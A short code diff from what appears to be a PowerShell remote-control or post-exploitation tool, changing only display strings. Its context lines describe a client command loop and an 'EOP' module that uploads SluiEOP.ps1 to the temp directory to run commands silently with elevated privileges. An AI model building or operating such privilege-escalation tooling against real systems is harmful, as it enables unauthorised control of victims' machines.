@@ -933,7 +933,7 @@ While($Client.Connected)
            {
               write-host " - Input Command: " -NoNewline;
               $mYcOMMAND = Read-Host
-              write-host "`n`n   EOP Module Remark" -ForegroundColor Yellow;
+              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
               write-host "   -----------------";
               write-host "   This module uploads SluiEOP.ps1 script to `$env:TMP dir and executes";
               write-host "   EOP to be abble to silent execute our command with higth privileges.";
@@ -2021,7 +2021,7 @@ While($Client.Connected)
           }ElseIf($SluiEOP -eq "True"){
             Write-Host "`n   Privs   Status   Description" -ForeGroundColor green;
             Write-Host "   -----   ------   -----------";
-            Write-Host "   user    upload   $OutPut"
+            Write-Host "   user    saved    $OutPut"
             $SluiEOP = "False"
           }else{
             $OutPut = $OutPut -replace "`n","";
